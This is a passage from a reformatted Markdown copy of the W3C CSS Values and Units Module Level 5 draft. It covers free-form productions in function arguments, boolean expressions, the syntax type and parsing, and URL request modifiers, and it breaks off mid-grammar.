Attribution and reformatting notice added for Surgeist on 2026-10-03

This reformatted document accompanies Surgeist as software implementation support. The original English document at the source URL remains authoritative; this copy is not a new technical specification. Added labels and representation notes are non-normative. W3C is not responsible for content absent from the original, and this copy may contain formatting or hypertext errors.

This software or document includes material copied from or derived from [CSS Values and Units Module Level 5](https://raw.githubusercontent.com/w3c/csswg-drafts/23abdab4aba7521d84efc6428466618222de1bd6/css-values-5/Overview.bs).

The selected CSSWG repository licenses this document by its contributors under the [W3C Software and Document License](../licenses/w3c/software-license-2023.txt); its [exact repository license declaration](../licenses/w3c/csswg-drafts/LICENSE.md) is retained. No source copyright year is supplied by that declaration.

License: [W3C Software and Document License, 2023 version](../licenses/w3c/software-license-2023.txt). Changes are format conversion, visible semantic labels, local exact-snapshot links, and passive SVG/TeX representations as detailed in the [conversion report](CONVERSION-REPORT.md). Original source text, status, authorship, and legal notices remain below.

# Source provenance

Title: CSS Values and Units Module Level 5

Source snapshot: https://raw.githubusercontent.com/w3c/csswg-drafts/23abdab4aba7521d84efc6428466618222de1bd6/css-values-5/Overview.bs

Pinned source SHA-256: e6d5093499619450110a8ce94b39a8fda8960a28c72eac49f1b2fbb051a000fd

Generated intermediate HTML SHA-256: ee09666aac3dc36283108919ccdf17f30220e6abd47b8983b958f1ba27d87bc2

Representation notes:
- Generated on 2026-10-03 from the exact pinned Bikeshed source with Bikeshed 7.1.3, then converted to Markdown. This is a generated rendering of that source, not an official publication or a captured historical rendering.
- The compiler used its bundled support-data manifest dated 2026-09-14 without updating it. External automatic link targets and generated bibliography descriptions come from that data; they do not establish historical versions of those external documents.
- Source headings, explicit anchors, normative prose, examples, metadata, and property-definition fields are retained. Compiler-inserted default property rows are omitted. Generated section numbers, cross-reference labels, and formatting are non-normative.
- 25 source test-reference lists are preserved as recorded, including hidden lists. Current test-index presence, links, and results are not asserted.
- The source’s feedback link to #sotd targets its preserved Status Text rather than newly generated publication-status boilerplate.
- Source row-header labels in readable Markdown tables are bold; native HTML th/scope accessibility semantics are not expressible in GFM. Field/Definition headings, where used, are added non-normative presentation labels.
- Small semantic emphasis/subscript/superscript HTML is retained to avoid GFM intraword-delimiter and subscript rendering defects; website layout HTML is not retained.
- Canonically unstable or combining Unicode characters and escape-sensitive punctuation are shielded as numeric entities in prose/semantic inline HTML. Literal source code stays literal.
- Existing external image/media URLs are resolved against the pinned source. Assets are not downloaded or availability-tested; image-only formulas/diagrams still require their source resources.

---

# CSS Values and Units Module Level 5

## <a id="source-metadata"></a>Source metadata

Metadata copied from the pinned source. Editor’s Draft status and work status are those of the source, not a claim of publication or present-day status.



| Field                | Source value                                                                                                                                          |
|----------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| Group                | CSSWG                                                                                                                                                 |
| Shortname            | css-values                                                                                                                                            |
| Level                | 5                                                                                                                                                     |
| Status               | ED                                                                                                                                                    |
| Work Status          | Exploring                                                                                                                                             |
| ED                   | https://drafts.csswg.org/css-values-5/                                                                                                                |
| TR                   | https://www.w3.org/TR/css-values-5/                                                                                                                   |
| Editor               | Tab Atkins, Google, http://xanthir.com/contact/, w3cid 42199                                                                                          |
| Editor               | Elika J. Etemad / fantasai, Apple, http://fantasai.inkedblade.net/contact, w3cid 35400                                                                |
| Editor               | Miriam E. Suzanne, Invited Expert, http://miriamsuzanne.com/contact, w3cid 117151                                                                     |
| Abstract             | This CSS module describes the common values and units that CSS properties accept and the syntax used for describing them in CSS property definitions. |
| Ignored Terms        | \<spacing-limit\>, containing block, property, \<wq-name\>                                                                                            |
| Ignored Vars         | Cn+1, n                                                                                                                                               |
| Inline Github Issues | no                                                                                                                                                    |
| Default Highlight    | css                                                                                                                                                   |
| Status Text          | <strong>This spec is in the early exploration phase. Feedback is welcome, and and major breaking changes are expected.</strong>                                                                                                                                   |
| Include MDN Panels   | yes                                                                                                                                                   |
| WPT Path Prefix      | css/css-values/                                                                                                                                       |



<a id="sotd"></a>

Status text from the pinned source: <strong>This spec is in the early exploration phase. Feedback is welcome, and and major breaking changes are expected.</strong>

## <a id="intro"></a>1.  Introduction

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-39df5f37"></a> <strong>This is a diff spec against <a href="https://www.w3.org/TR/css-values-4/">CSS Values and Units Level 4</a>.</strong>

### <a id="placement"></a>1.1.  Module Interactions

This module extends [\[CSS-VALUES-4\]](#biblio-css-values-4) which replaces and extends the data type definitions in [\[CSS21\]](#biblio-css21) sections [1.4.2.1](https://www.w3.org/TR/CSS21/about.html#value-defs), [4.3](https://www.w3.org/TR/CSS21/syndata.html#values), and [A.2](https://www.w3.org/TR/CSS21/aural.html#aural-intro).

## <a id="textual-values"></a>2.  Textual Data Types

See [CSS Values 4 § 4 Textual Data Types](https://drafts.csswg.org/css-values-4/#textual-values).

## <a id="value-defs"></a>3.  Value Definition Syntax

See [CSS Values 4 § 2 Value Definition Syntax](https://drafts.csswg.org/css-values-4/#value-defs).

Additionally,

1.  <a id="ref-for-media-query"></a>

    <a id="ref-for-typedef-boolean-expr①"></a>

    <a id="ref-for-typedef-boolean-expr"></a>

    Boolean combinations of a conditional notation. These are written using the [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) notation, and represent recursive expressions of boolean logic using keywords and parentheses, applied to the grammar specified in brackets, e.g. [\<boolean-expr\[ ( &#x26;lt;media-feature&#x26;gt; ) \]\>](#typedef-boolean-expr) to express [media queries](https://drafts.csswg.org/mediaqueries-5/#media-query).

### <a id="component-functions"></a>3.1.  Functional Notation Definitions

See [CSS Values 4 § 2.6 Functional Notation Definitions](https://drafts.csswg.org/css-values-4/#component-functions).

#### <a id="component-function-commas"></a>3.1.1.  Commas in Function Arguments

<a id="ref-for-functional-notation"></a>

<a id="ref-for-funcdef-if"></a>

<a id="ref-for-funcdef-mix"></a>

<a id="ref-for-whole-value"></a>

<a id="ref-for-typedef-declaration-value"></a>

<a id="ref-for-typedef-any-value"></a>

[Functional notation](https://drafts.csswg.org/css-values-4/#functional-notation) often uses commas to separate parts of its internal grammar, and occasionally other syntax (such as `:` or `;` in [if()](#funcdef-if)). However, some functions (such as [mix()](https://www.w3.org/TR/css-values-5/#funcdef-mix)) allow values that, themselves, could contain these argument-separating tokens. These values (currently [\<whole-value\>](#whole-value), [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value), and [\<any-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-any-value)) are <a id="free-form-productions"></a>free-form productions.

<a id="ref-for-free-form-productions"></a>

<a id="ref-for-tokendef-open-curly"></a>

To accommodate these sorts of grammars unambiguously, the [free-form productions](#free-form-productions) can be optionally wrapped in curly braces {}. These braces are syntactic, not part of the actual value, and only serve to explicitly indicate the bounds of the production. A <a id="ref-for-free-form-productions①"></a>free-form production can either (after optional whitespace) start with a [\<{-token\>](https://drafts.csswg.org/css-syntax-3/#tokendef-open-curly), or not:

If it does not start with a "{" token  
The production does not match any top-level commas or {} blocks. (The production stops parsing at that point, so the comma or {} block is matched by the next grammar term instead; probably the function’s own argument-separating comma.) Individual usages of the production can define additional tokens that are similarly restricted from matching at the top-level.

If it does start with a "{" token  
The production matches just the {} block that the "{" token opens. It represents the <em>contents</em> of that block, ignoring the {} block wrapper itself.

<a id="ref-for-free-form-productions②"></a>

<a id="ref-for-typedef-declaration-value①"></a>

<a id="ref-for-typedef-semicolon-token"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: General restrictions defined for a particular [free-form production](#free-form-productions), like [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) not matching [\<semicolon-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-semicolon-token)s, apply regardless of whether it’s {}-wrapped or not.

<a id="ref-for-funcdef-random-item"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-5ade5fea"></a> For example, the grammar of the [random-item()](#funcdef-random-item) function is:
>
> <a id="ref-for-typedef-random-key"></a>
>
> <a id="ref-for-typedef-declaration-value②"></a>
>
> ```text
> random-item( <random-key>, [<declaration-value>?]# )
> ```
>
> The \# indicates comma-separated repetitions, so randomly choosing between three keywords would be written as normal for functions, like:
>
> ```text
> font-family: random-item(--x, serif, sans-serif, monospace);
> ```
>
> However, sometimes the values you want to choose between need to include commas. When this is the case, wrapping the values in {} allows their commas to be distinguished from the function’s argument-separating commas:
>
> ```text
> font-family: random-item(--x, {Times, serif}, {Arial, sans-serif}, {Courier, monospace});
> ```
>
> This randomly chooses one of three font-family lists: either Times, serif, or Arial, sans-serif, or Courier, monospace.
>
> This is not all-or-nothing; you can use {} around <em>some</em> arguments that need it, while leaving others bare when they don’t need it. You are also allowed to use {} around a value when it’s not strictly required. For example:
>
> ```text
> font-family: random-item(--x, {Times, serif}, sans-serif, {monospace});
> ```
>
> <a id="ref-for-valdef-font-family-sans-serif"></a>
>
> <a id="ref-for-valdef-font-family-monospace"></a>
>
> This represents choosing between three font-family lists: either Times, serif, or [sans-serif](https://drafts.csswg.org/css-fonts-4/#valdef-font-family-sans-serif), or [monospace](https://drafts.csswg.org/css-fonts-4/#valdef-font-family-monospace).
>
> <a id="ref-for-free-form-productions③"></a>
>
> However, this {}-wrapping is <em>only</em> allowed for some function arguments—​those defined as [free-form productions](#free-form-productions). It’s not valid for any other productions; if you use {} around other function arguments, it’ll just fail to match the function’s grammar and become invalid. For example, the following is <strong>invalid</strong>:
>
> ```text
> background-image: linear-gradient(to left, {red}, magenta);
> ```
<a id="ref-for-arbitrary-substitution-function"></a>

<a id="ref-for-funcdef-var"></a>

<a id="ref-for-propdef-font-family"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Because {} wrappers are allowed even when not explicitly required, they can be used defensively around values when the author isn’t sure if they’ll end up containing commas or not, due to [arbitrary substitution functions](#arbitrary-substitution-function) like [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var). For example, [font-family: random-item(--x, {var(--list1)}, monospace)](https://drafts.csswg.org/css-fonts-4/#propdef-font-family) will work correctly regardless of whether the --list1 custom property contains a comma-separated list or not.

<a id="ref-for-functional-notation①"></a>

[Functional notations](https://drafts.csswg.org/css-values-4/#functional-notation) are serialized without {} wrappers whenever possible.

<a id="ref-for-free-form-productions④"></a>

The following generic productions are [free-form productions](#free-form-productions):

- <a id="ref-for-typedef-any-value①"></a>

  [\<any-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-any-value)

- <a id="ref-for-whole-value①"></a>

  [\<whole-value\>](#whole-value)

- <a id="ref-for-typedef-declaration-value③"></a>

  [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)

<a id="ref-for-typedef-declaration-value④"></a>

<a id="ref-for-funcdef-var①"></a>

<a id="ref-for-free-form-productions⑤"></a>

For legacy compat reasons, the [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) defined for the fallback value of [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) is a <a id="non-strict-free-form-production"></a>non-strict free-form production. It ignores the rules restricting what it can contain when it does not start with a "{" token: it is allowed to contain commas and {} blocks. It still follows the standard [free-form production](#free-form-productions) rules when it <em>does</em> start with a "{" token, however: the fallback is just the contents of the {} block, and doesn’t include the {} wrapper itself.

<a id="ref-for-non-strict-free-form-production"></a>

Other contexts <em>may</em> define that they use [non-strict free-form productions](#non-strict-free-form-production), but it <em>should</em> be avoided unless necessary.

<a id="ref-for-typedef-boolean-expr②"></a>

### <a id="boolean"></a>3.2.  Boolean Expression Multiplier [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr)

<a id="ref-for-at-ruledef-media"></a>

<a id="ref-for-at-ruledef-supports"></a>

<a id="ref-for-funcdef-if①"></a>

<a id="ref-for-typedef-boolean-expr③"></a>

Several contexts (such as [@media](https://drafts.csswg.org/css-conditional-3/#at-ruledef-media), [@supports](https://drafts.csswg.org/css-conditional-3/#at-ruledef-supports), [if()](#funcdef-if), ...) specify conditions, and allow combining those conditions with boolean logic (and/or/not/grouping). Because they use the same non-trivial recursive syntax structure, the special <a id="typedef-boolean-expr"></a>[\<boolean-expr\>](#typedef-boolean-expr) production represents this pattern generically.

<a id="ref-for-typedef-boolean-expr④"></a>

<a id="ref-for-valdef-media-not"></a>

The [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) notation wraps another value type in the square brackets within it, e.g. \<boolean\[ \<test\> \]\>, and represents that value type alone as well as boolean combinations using the [not](https://drafts.csswg.org/mediaqueries-5/#valdef-media-not), and, and or keywords and grouping parenthesis. It is formally equivalent to:

<a id="ref-for-comb-one"></a>

<a id="ref-for-mult-zero-plus"></a>

<a id="ref-for-comb-one①"></a>

<a id="ref-for-mult-zero-plus①"></a>

<a id="ref-for-comb-one②"></a>

<a id="ref-for-comb-one③"></a>

```text
<boolean-expr[ <test> ]> = not <boolean-expr-group> | <boolean-expr-group>
                                            [ [ and <boolean-expr-group> ]*
                                            | [ or <boolean-expr-group> ]* ]

<boolean-expr-group> = <test> | ( <boolean-expr[ <test> ]> ) | <general-enclosed>
```
<a id="ref-for-typedef-boolean-expr⑤"></a>

The [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) production represents a true, false, or unknown value. Its value is resolved using 3-value Kleene logic, with top-level unknown values (those not directly nested inside the grammar of another <a id="ref-for-typedef-boolean-expr⑥"></a>\<boolean-expr\[\]\>) resolving to false unless otherwise specified; see [Appendix B: Boolean Logic](#boolean-logic) for details.

<a id="ref-for-at-ruledef-container"></a>

<a id="ref-for-typedef-boolean-expr⑦"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-431f6d8a"></a> For example, the [@container](https://drafts.csswg.org/css-conditional-5/#at-ruledef-container) rule allows a wide variety of tests: including size queries, style queries, and scroll-state queries. All of these are arbitrarily combinable with boolean logic. Using [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr), the grammar for an <a id="ref-for-at-ruledef-container①"></a>@container query could be written as:
>
> <a id="ref-for-comb-one④"></a>
>
> <a id="ref-for-comb-one⑤"></a>
>
> <a id="ref-for-comb-one⑥"></a>
>
> <a id="ref-for-comb-one⑦"></a>
>
> <a id="ref-for-comb-one⑧"></a>
>
> ```text
> <container-query> = <boolean-expr[ <cq-test> ]>
> <cq-test> = (<size-query>) | style( <style-query> ) | scroll-state( <scroll-state-query> )
> <size-query> = <boolean-expr[ ( <size-feature> ) ]> | <size-feature>
> <style-query> = <boolean-expr[ ( <style-feature> ) ]> | <style-feature>
> <scroll-state-query> = <boolean-expr[ ( <scroll-state-feature> ) ]> | <scroll-state-feature>
> ```
<a id="ref-for-typedef-general-enclosed"></a>

<a id="ref-for-typedef-boolean-expr⑧"></a>

The [\<general-enclosed\>](https://drafts.csswg.org/mediaqueries-5/#typedef-general-enclosed) branch of the logic allows for future compatibility—​unless otherwise specified new expressions in an older UA will be parsed and considered “unknown”, rather than invalidating the production. For consistency with that allowance, the \<test\> term in a [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) should be defined to match <a id="ref-for-typedef-general-enclosed①"></a>\<general-enclosed\>.

<a id="ref-for-typedef-syntax"></a>

### <a id="css-syntax"></a>3.3.  Specifying CSS Syntax in CSS: the [\<syntax\>](#typedef-syntax) type

<a id="ref-for-funcdef-attr"></a>

<a id="ref-for-registered-custom-property"></a>

<a id="ref-for-typedef-syntax①"></a>

<a id="ref-for-css-value-definition-syntax"></a>

<a id="ref-for-syntax-definition"></a>

Some features in CSS, such as the [attr()](#funcdef-attr) function or [registered custom properties](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property), allow you to specify how <em>another</em> value is meant to be parsed. This is declared via the [\<syntax\>](#typedef-syntax) production, which resembles a limited form of the CSS [value definition syntax](https://drafts.csswg.org/css-values-4/#css-value-definition-syntax) used in specifications to define CSS features, and which represents a [syntax definition](https://drafts.css-houdini.org/css-properties-values-api-1/#syntax-definition):

<a id="typedef-syntax"></a>

<a id="ref-for-typedef-syntax②"></a>

<a id="ref-for-comb-one⑨"></a>

<a id="ref-for-typedef-syntax-component"></a>

<a id="ref-for-typedef-syntax-combinator"></a>

<a id="ref-for-typedef-syntax-component①"></a>

<a id="ref-for-mult-zero-plus②"></a>

<a id="ref-for-comb-one①⓪"></a>

<a id="ref-for-typedef-syntax-string"></a>

<a id="typedef-syntax-component"></a>

<a id="ref-for-typedef-syntax-component②"></a>

<a id="ref-for-typedef-syntax-single-component"></a>

<a id="ref-for-typedef-syntax-multiplier"></a>

<a id="ref-for-mult-opt"></a>

<a id="ref-for-comb-one①①"></a>

<a id="typedef-syntax-single-component"></a>

<a id="ref-for-typedef-syntax-single-component①"></a>

<a id="ref-for-typedef-syntax-type-name"></a>

<a id="ref-for-comb-one①②"></a>

<a id="ref-for-typedef-ident"></a>

<a id="typedef-syntax-type-name"></a>

<a id="ref-for-typedef-syntax-type-name①"></a>

<a id="ref-for-comb-one①③"></a>

<a id="ref-for-comb-one①④"></a>

<a id="ref-for-comb-one①⑤"></a>

<a id="ref-for-comb-one①⑥"></a>

<a id="ref-for-comb-one①⑦"></a>

<a id="ref-for-comb-one①⑧"></a>

<a id="ref-for-comb-one①⑨"></a>

<a id="ref-for-comb-one②⓪"></a>

<a id="ref-for-comb-one②①"></a>

<a id="ref-for-comb-one②②"></a>

<a id="ref-for-comb-one②③"></a>

<a id="ref-for-comb-one②④"></a>

<a id="ref-for-comb-one②⑤"></a>

<a id="typedef-syntax-combinator"></a>

<a id="ref-for-typedef-syntax-combinator①"></a>

<a id="typedef-syntax-multiplier"></a>

<a id="ref-for-typedef-syntax-multiplier①"></a>

<a id="ref-for-comb-one②⑥"></a>

<a id="typedef-syntax-string"></a>

<a id="ref-for-typedef-syntax-string①"></a>

<a id="ref-for-string-value"></a>

```text
<syntax> = '*' | <syntax-component> [ <syntax-combinator> <syntax-component> ]* | <syntax-string>
<syntax-component> = <syntax-single-component> <syntax-multiplier>?
                   | '<' transform-list '>'
<syntax-single-component> = '<' <syntax-type-name> '>' | <ident>
<syntax-type-name> = angle | color | custom-ident | image | integer
                   | length | length-percentage | number
                   | percentage | resolution | string | time
                   | url | transform-function
<syntax-combinator> = '|'
<syntax-multiplier> = [ '#' | '+' ]

<syntax-string> = <string>
```
<a id="ref-for-typedef-syntax-component③"></a>

<a id="ref-for-typedef-syntax-type-name②"></a>

<a id="ref-for-css-supported-syntax-component-name"></a>

<a id="ref-for-typedef-ident①"></a>

<a id="ref-for-css-keyword"></a>

<a id="ref-for-list"></a>

A [\<syntax-component\>](#typedef-syntax-component) consists of either a [\<syntax-type-name\>](#typedef-syntax-type-name) between \<\> (angle brackets), which maps to one of the [supported syntax component names](https://drafts.css-houdini.org/css-properties-values-api-1/#css-supported-syntax-component-name), or an [\<ident\>](https://drafts.csswg.org/css-values-4/#typedef-ident), which represents any [keyword](https://drafts.csswg.org/css-values-4/#css-keyword). Additionally, a <a id="ref-for-typedef-syntax-component④"></a>\<syntax-component\> may contain a [multiplier](https://drafts.css-houdini.org/css-properties-values-api-1/#multipliers), which indicates a [list](https://infra.spec.whatwg.org/#list) of values.

<a id="ref-for-length-value"></a>

<a id="ref-for-css-keyword①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This means that `<length>` and `length` are two different types: the former describes a [\<length\>](https://drafts.csswg.org/css-values-4/#length-value), whereas the latter describes a [keyword](https://drafts.csswg.org/css-values-4/#css-keyword) `length`.

<a id="ref-for-typedef-syntax-component⑤"></a>

<a id="ref-for-typedef-delim-token"></a>

Multiple [\<syntax-component\>](#typedef-syntax-component)s may be [combined](https://drafts.css-houdini.org/css-properties-values-api-1/#combinator) with a `|` [\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token), causing the syntax components to be matched against a value in the specified order.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-2dceeea6"></a>
>
> ```css
> <percentage> | <number> | auto
> ```
>
> <a id="ref-for-typedef-syntax③"></a>
>
> <a id="ref-for-percentage-value"></a>
>
> <a id="ref-for-number-value"></a>
>
> The above, when parsed as a [\<syntax\>](#typedef-syntax), would accept [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) values, [\<number\>](https://drafts.csswg.org/css-values-4/#number-value) values, as well as the keyword `auto`.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-a723371b"></a>
>
> ```css
> red | <color>
> ```
>
> <a id="ref-for-syntax-definition①"></a>
>
> <a id="ref-for-typedef-syntax④"></a>
>
> <a id="ref-for-css-parse-something-according-to-a-css-grammar"></a>
>
> <a id="ref-for-css-css-identifier"></a>
>
> <a id="ref-for-typedef-color"></a>
>
> The [syntax definition](https://drafts.css-houdini.org/css-properties-values-api-1/#syntax-definition) resulting from the above [\<syntax\>](#typedef-syntax), when used as a grammar for [parsing](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar), would match an input `red` as an [identifier](https://drafts.csswg.org/css-values-4/#css-css-identifier), but would match an input `blue` as a [\<color\>](https://drafts.csswg.org/css-color-5/#typedef-color).

<a id="ref-for-typedef-delim-token①"></a>

<a id="ref-for-universal-syntax-definition"></a>

The `*` [\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token) represents the [universal syntax definition](https://drafts.css-houdini.org/css-properties-values-api-1/#universal-syntax-definition).

<a id="ref-for-typedef-syntax-multiplier②"></a>

The `<transform-list>` production is a convenience form equivalent to `<transform-function>+`. <strong data-conversion-semantic="note">Note:</strong> Note that `<transform-list>` may not be followed by a [\<syntax-multiplier\>](#typedef-syntax-multiplier).

<a id="ref-for-whitespace"></a>

<a id="ref-for-typedef-delim-token②"></a>

<a id="ref-for-typedef-syntax-type-name③"></a>

<a id="ref-for-typedef-syntax-multiplier③"></a>

[Whitespace](https://drafts.csswg.org/css-syntax-3/#whitespace) is not allowed between the angle bracket [\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token)s (`<` `>`) and the [\<syntax-type-name\>](#typedef-syntax-type-name) they enclose, nor is <a id="ref-for-whitespace①"></a>whitespace allowed to precede a [\<syntax-multiplier\>](#typedef-syntax-multiplier).

<a id="ref-for-whitespace②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [whitespace](https://drafts.csswg.org/css-syntax-3/#whitespace) restrictions also apply to `<transform-list>`.

<a id="ref-for-typedef-syntax-string②"></a>

<a id="ref-for-string-value①"></a>

<a id="ref-for-css-parse-something-according-to-a-css-grammar①"></a>

<a id="ref-for-typedef-syntax⑤"></a>

A [\<syntax-string\>](#typedef-syntax-string) is a [\<string\>](https://drafts.csswg.org/css-values-4/#string-value) whose value successfully [parses](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) as a [\<syntax\>](#typedef-syntax), and represents the same value as that <a id="ref-for-typedef-syntax⑥"></a>\<syntax\> would.

<a id="ref-for-typedef-syntax-string③"></a>

<a id="ref-for-typedef-syntax⑦"></a>

<a id="ref-for-at-ruledef-property"></a>

<a id="ref-for-string-value②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: [\<syntax-string\>](#typedef-syntax-string) mostly exists for historical purposes; before [\<syntax\>](#typedef-syntax) was defined, the [@property](https://drafts.css-houdini.org/css-properties-values-api-1/#at-ruledef-property) rule used a [\<string\>](https://drafts.csswg.org/css-values-4/#string-value) for this purpose.

<a id="ref-for-typedef-syntax⑧"></a>

#### <a id="parse-syntax"></a>3.3.1.  Parsing as [\<syntax\>](#typedef-syntax)

<a id="ref-for-typedef-syntax⑨"></a>

<a id="ref-for-registered-custom-property①"></a>

<a id="ref-for-funcdef-attr①"></a>

<a id="ref-for-css-parse-something-according-to-a-css-grammar②"></a>

The purpose of a [\<syntax\>](#typedef-syntax) is usually to specify how to parse another value (such as the value of a [registered custom property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property), or an attribute value in [attr()](#funcdef-attr)). However, the generic [parse something according to a CSS grammar](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) algorithm returns an unspecified internal structure, since parse results might be ambiguous and need further massaging.

<a id="ref-for-parse-with-a-syntax"></a>

To avoid these issues and get a well-defined result, use [parse with a \<syntax\>](#parse-with-a-syntax):

<a id="ref-for-typedef-syntax①⓪"></a>

<a id="ref-for-string"></a>

<a id="ref-for-list①"></a>

<a id="ref-for-component-value"></a>

<a id="ref-for-typedef-syntax①①"></a>

<a id="ref-for-guaranteed-invalid-value"></a>

To <a id="parse-with-a-syntax"></a>parse with a [\<syntax\>](#typedef-syntax) given a [string](https://infra.spec.whatwg.org/#string) or [list](https://infra.spec.whatwg.org/#list) or [component values](https://drafts.csswg.org/css-syntax-3/#component-value) <var>values</var>, a [\<syntax\>](#typedef-syntax) value <var>syntax</var>, and optionally an element <var>el</var> for context, perform the following steps. It returns either CSS values, or the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

1.  <a id="ref-for-parse-a-list-of-component-values"></a>

    [Parse a list of component values](https://drafts.csswg.org/css-syntax-3/#parse-a-list-of-component-values) from <var>values</var>, and let <var>raw parse</var> be the result.

2.  <a id="ref-for-substitute-arbitrary-substitution-function"></a>

    If <var>el</var> was given, [substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in <var>raw parse</var>, and set <var>raw parse</var> to that result.

3.  <a id="ref-for-css-parse-something-according-to-a-css-grammar③"></a>

    <a id="ref-for-x"></a>

    <a id="ref-for-typedef-declaration-value⑤"></a>

    [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) <var>values</var> according to <var>syntax</var>, with a [\*](https://drafts.csswg.org/selectors-3/#x) value treated as <code><a href="https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value">&lt;declaration-value&gt;</a>?</code>, and let <var>parsed result</var> be the result. If <var>syntax</var> used a \| combinator, let <var>parsed result</var> be the parse result from the first matching clause.

4.  <a id="ref-for-guaranteed-invalid-value①"></a>

    If <var>parsed result</var> is failure, return the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

5.  <a id="ref-for-typedef-syntax①②"></a>

    <a id="ref-for-x①"></a>

    Assert: <var>parsed result</var> is now a well-defined list of one or more CSS values, since each branch of a [\<syntax\>](#typedef-syntax) defines an unambiguous parse result (or the [\*](https://drafts.csswg.org/selectors-3/#x) syntax is unambiguous on its own).

6.  Return <var>parsed result</var>.

<a id="ref-for-computed-value"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This algorithm does not resolved the parsed values into [computed values](https://drafts.csswg.org/css-cascade-5/#computed-value); the context in which the value is used will usually do that already, but if not, the invoking algorithm will need to handle that on its own.

## <a id="level-4-extensions"></a>4.  Extensions to Level 4 Value Types

See [CSS Values and Units Level 4](https://www.w3.org/TR/css-values-4/).

<a id="ref-for-url-value"></a>

### <a id="urls"></a>4.1.  Resource Locators: the [\<url\>](https://drafts.csswg.org/css-values-4/#url-value) type

See [CSS Values 4 § 4.5 Resource Locators: the \<url\> type](https://drafts.csswg.org/css-values-4/#urls).

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/urls/empty.html`
- `css/css-values/urls/fragment-only.html`
- `css/css-values/urls/resolve-relative-to-base.sub.html`
- `css/css-values/urls/resolve-relative-to-stylesheet.html`
- `css/css-values/inline-cache-base-uri-cssom.html`
- `css/css-values/inline-cache-base-uri.html`

#### <a id="request-url-modifiers"></a>4.1.1.  Request URL Modifiers

<a id="ref-for-typedef-request-url-modifier"></a>

<a id="ref-for-typedef-url-modifier"></a>

<a id="ref-for-url-value①"></a>

<a id="ref-for-concept-request"></a>

<a id="ref-for-url-request-modifier-steps"></a>

<a id="typedef-request-url-modifier"></a>[\<request-url-modifier\>](#typedef-request-url-modifier)s are [\<url-modifier\>](https://drafts.csswg.org/css-values-4/#typedef-url-modifier)s that affect the [\<url\>](https://drafts.csswg.org/css-values-4/#url-value)’s resource [request](https://fetch.spec.whatwg.org/#concept-request) by applying associated [URL request modifier steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps). See [CSS Values 4 § 4.5.4 URL Processing Model](https://drafts.csswg.org/css-values-4/#url-processing).

<a id="ref-for-typedef-request-url-modifier①"></a>

This specification defines the following [\<request-url-modifier\>](#typedef-request-url-modifier)s:

<a id="ref-for-typedef-request-url-modifier②"></a>

<a id="ref-for-typedef-request-url-modifier-cross-origin-modifier"></a>

<a id="ref-for-comb-one②⑦"></a>

<a id="ref-for-typedef-request-url-modifier-integrity-modifier"></a>

<a id="ref-for-comb-one②⑧"></a>

<a id="ref-for-typedef-request-url-modifier-referrer-policy-modifier"></a>

<a id="ref-for-typedef-request-url-modifier-cross-origin-modifier①"></a>

<a id="ref-for-comb-one②⑨"></a>

<a id="ref-for-typedef-request-url-modifier-integrity-modifier①"></a>

<a id="ref-for-string-value③"></a>

<a id="ref-for-typedef-request-url-modifier-referrer-policy-modifier①"></a>

<a id="ref-for-comb-one③⓪"></a>

<a id="ref-for-comb-one③①"></a>

<a id="ref-for-comb-one③②"></a>

<a id="ref-for-comb-one③③"></a>

<a id="ref-for-comb-one③④"></a>

<a id="ref-for-comb-one③⑤"></a>

<a id="ref-for-comb-one③⑥"></a>

```text
<request-url-modifier> = <cross-origin-modifier> | <integrity-modifier> | <referrer-policy-modifier>
<cross-origin-modifier> = cross-origin(anonymous | use-credentials)
<integrity-modifier> = integrity(<string>)
